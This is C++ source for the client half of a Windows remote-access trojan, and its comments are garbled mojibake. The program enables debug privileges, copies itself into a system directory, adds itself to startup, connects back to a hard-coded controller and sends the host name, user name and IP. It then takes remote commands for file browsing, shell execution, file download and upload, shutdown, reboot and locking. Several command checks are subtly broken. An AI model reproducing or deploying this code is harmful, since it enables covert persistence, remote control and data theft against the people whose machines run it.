#include "../tcpSocket/tcpSocke.h"

int GetPCMessage(SOCKET fd);//��ȡ�����������Ϣ

int FileBrowse(SOCKET fd, char* str);//�ļ����

int recvFile(SOCKET fd, char* buf);//�ļ�����

int shell(SOCKET fd, const char* cmd, char* result);//ִ��shellָ��

int sendFile(SOCKET fd, char* buf);//�ļ��ϴ�

bool UpPrivilegeValue();//��Ȩ����

int main()
{
	if (true == UpPrivilegeValue())
	{
		//cout << "successs" << endl;
	}

	char pathName[MAX_PATH];//�ļ��������260���ַ�  MAX_PATH  260

	copySelf(pathName);//���ļ����Ƶ�ϵͳĿ¼

	ComputerStart(pathName);//���ó��򿪻�����

	init_Socket();//�����ͻ���socket

	SOCKET fd = CreatClientScoket("192.168.0.107");//����

	char str[BUFSIZ] = "connect success";//���ӳɹ�
	encode(str);
	send(fd, str, BUFSIZ, 0);
	Sleep(200);

	GetPCMessage(fd);//��PC��Ϣ���͸������

	HeartBeat(fd);//��������

	char command[BUFSIZ] = {0};//�洢���յ�ָ��
	char recvbuf[BUFSIZ] = { 0 };//������Ϣ�Ļ�����
	//������Ӧ���̣߳���Ҫʹ��ʱ�ͼ���
	while (true)
	{
		recv(fd, command, BUFSIZ, 0);
		decode(command);
		if (strcmp(command, "filebrowse"))
		{
			while (true)
			{
				recv(fd, recvbuf, BUFSIZ, 0);
				if (strcmp(recvbuf, "exit") == 0)
				{
					break;
				}
				thread th1 = thread(FileBrowse, fd, recvbuf);
				th1.join();
			}
			continue;
		}
		else if (strcmp(command, "shell"))
		{
			char res[BUFSIZ * 2] = { 0 };
			thread th2 = thread(shell, fd, recvbuf, res);
			th2.join();
			continue;
		}
		else if(strcmp(command, "download"))
		{
			thread th3 = thread(sendFile, fd, recvbuf);
			th3.join();
			continue;
		}
		else if (strcmp(command, "upload"))
		{
			thread th4 = thread(recvFile, fd, recvbuf);
			th4.join();
			continue;
		}
		else if(strcmp(command, "upright"))
		{
			thread th5 = thread(UpPrivilegeValue);
			th5.join();
			continue;
		}
		else if (strcmp(command, "kill"))
		{
			char text[] = "Client has exit!";
			encode(text);
			send(fd, text, strlen(text), 0);//�رտͻ���
			exit(0);
			continue;
		}
		else if (strcmp(command, "shutdown"))
		{
			system("shutdown -s -t 1");//�ػ�
			continue;
		}
		else if (strcmp(command, "reboot"))
		{
			system("shutdown -r -t 10"); //����
			continue;
		}
		else if (strcmp(command, "cancel"))
		{
			system("shutdown -a");//ȡ���ػ�
			continue;
		}
		else if (strcmp(command, "lock"))
		{
			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");//����
			continue;
		}
		else
		{
			send(fd, "Error code", strlen("Error code"), 0);//����ָ�����
			continue;
		}
		ZeroMemory(recvbuf, sizeof(recvbuf));//��ʼ��
		ZeroMemory(command, sizeof(command));//��ʼ��
		Sleep(2000);
	}
	closesocket(fd);//�رտͻ���socket

	close_Socket();//WSACleanup
}

int GetPCMessage(SOCKET fd)
{
	PC_Message msg = { {0}, {0}, {0} };//����msg�ṹ��
	char UserName[BUFSIZ] = { 0 };//����ͳ�ʼ��

	if (getmessage(&msg) == false)//��ȡĿ��������IP����������Լ��û���
	{
		//err("getmessage");
	}

	TcharToChar(msg.UserName, UserName);//��TCHARת��Ϊchar
	encode(msg.PCName);//����
	//cout << msg.PCName << endl;
	encode(UserName);
	//cout << UserName << endl;
	encode(msg.IP);
	//cout << msg.IP << endl;

	send(fd, msg.PCName, BUFSIZ, 0);
	
	send(fd, UserName, BUFSIZ, 0);
	
	send(fd, msg.IP, BUFSIZ, 0);
	
	return 0;
}

int FileBrowse(SOCKET fd, char* str)
{
	//��ȡĿ��·���µ��ļ���
	char FileName[FileNameRow][FileNameCol];
	char Zero[FileNameCol] = { 0 };
	GetFileName(FileName, str);
	for (int i = 0; i < FileNameRow; i++)
	{
		if (strcmp(FileName[i], Zero))
		{
			//printf("%s\n", FileName[i]);
			send(fd, FileName[i], FileNameRow, 0);
		}
	}
	return 0;
}

int sendFile(SOCKET fd, char* buf)
{
	ZeroMemory(buf, sizeof(buf));
	recv(fd, buf, BUFSIZ, 0);//����Ҫ���ص��ļ���������·����
	char sendbuf[BUFSIZ * 2];
	DWORD dwRead;
	BOOL bRet;
	Sleep(200);

	HANDLE hFile = CreateFile((LPCWSTR)buf, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
		return 1;
	}
	while (true) 
	{   //�����ļ���buf
		bRet = ReadFile(hFile, sendbuf, 1024, &dwRead, NULL);
		if (bRet == FALSE)
		{
			break;
		}
		else if (dwRead == 0) 
		{
			Sleep(100);
			break;
		}
		else 
		{
			send(fd, sendbuf, dwRead, 0);
		}
	}
	char res[] = "success";
	encode(res);
	send(fd, res, strlen(res) + 1, 0);
	return 0;
}

int recvFile(SOCKET fd, char* buf)//�ļ�����
{
	ZeroMemory(buf, sizeof(buf));
	recv(fd, buf, BUFSIZ, 0);//����Ҫ�ϴ��ļ��ľ���·��
	int len;
	char recvBuf[1024] = { 0 };   // ������
	HANDLE hFile;               // �ļ����
	DWORD count;                // д������ݼ���

	hFile = CreateFile((LPCWSTR)buf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
		return 1;
	}
	char begin[] = "BEGIN";
	encode(begin);
	send(fd, begin, strlen(begin), 0);
	while (true) 
	{
		// �ӿͻ��˶�����
		ZeroMemory(recvBuf, sizeof(recvBuf));
		len = recv(fd, recvBuf, 1024, 0);
		decode(recvBuf);
		if (strlen(recvBuf) < 5) 
		{
			if (strcmp(recvBuf, "EOF") == 0) {
				CloseHandle(hFile);
				break;
			}
		}
		WriteFile(hFile, recvBuf, len, &count, 0);
	}
	Sleep(500);
	char RECV[] = "RECV";
	encode(RECV);
	send(fd, RECV, strlen(RECV), 0);
	return 0;
}

int shell(SOCKET fd, const char* cmd, char* result)
{
	int iRet = -1;
	char buf_ps[BUFSIZ * 2];
	char ps[BUFSIZ * 2] = { 0 };
	FILE* ptr;

	strcpy(ps, cmd);

	if ((ptr = _popen(ps, "r")) != NULL)
	{
		while (fgets(buf_ps, sizeof(buf_ps), ptr) != NULL)
		{
			strcat(result, buf_ps);
			if (strlen(result) > BUFSIZ * 2)
			{
				break;
			}
		}
		_pclose(ptr);
		ptr = NULL;
		iRet = 0;  // ����ɹ�
	}
	//else
	//{
	//    printf("popen %s error\n", ps);
	//    iRet = -1; // ����ʧ��
	//}
	send(fd, result, BUFSIZ * 2, 0);
	return iRet;
}

bool UpPrivilegeValue()
{
	HANDLE token_handle;
	//�򿪷�������
	if (!OpenProcessToken(GetCurrentProcess(),       //Ҫ�޸�Ȩ�޵Ľ��̾��
		TOKEN_ALL_ACCESS,          //Ҫ�����ƽ��к��ֲ���
		&token_handle              //��������
	))
	{
		//printf("openProcessToken error");
	}

	LUID luid;
	if (!LookupPrivilegeValue(NULL,                 //�鿴��ϵͳ������ΪNULL
		SE_DEBUG_NAME,        //Ҫ�鿴����Ȩ����
		&luid                 //�������ձ�ʶ��
	))
	{
		//printf("lookupPrivilegevalue error");
	}
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	//������������Ȩ��
	if (!AdjustTokenPrivileges(token_handle,    //���ƾ��
		FALSE,           //�Ƿ����Ȩ��
		&tkp,            //�µ���Ȩ��Ȩ����Ϣ
		sizeof(tkp),     //��Ȩ��Ϣ��С
		NULL,            //����������Ȩ��Ϣ��ǰ״̬��buffer
		NULL             //��������С
	))
	{
		//printf("adjust error");
	}
	//printf("sucessful");
	return true;
}